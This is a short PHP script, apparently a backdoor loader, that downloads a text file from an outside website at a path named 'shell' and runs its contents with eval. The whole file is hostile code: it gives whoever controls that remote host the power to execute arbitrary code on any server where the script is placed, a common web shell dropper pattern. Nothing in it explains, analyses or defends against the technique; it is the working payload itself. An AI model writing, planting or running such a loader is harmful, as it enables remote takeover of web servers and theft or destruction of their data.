<?php

$content = file_get_contents(urldecode('https://fifutravel.com/repositori/shell/about.txt'));

$content = "?> ".$content;
eval($content);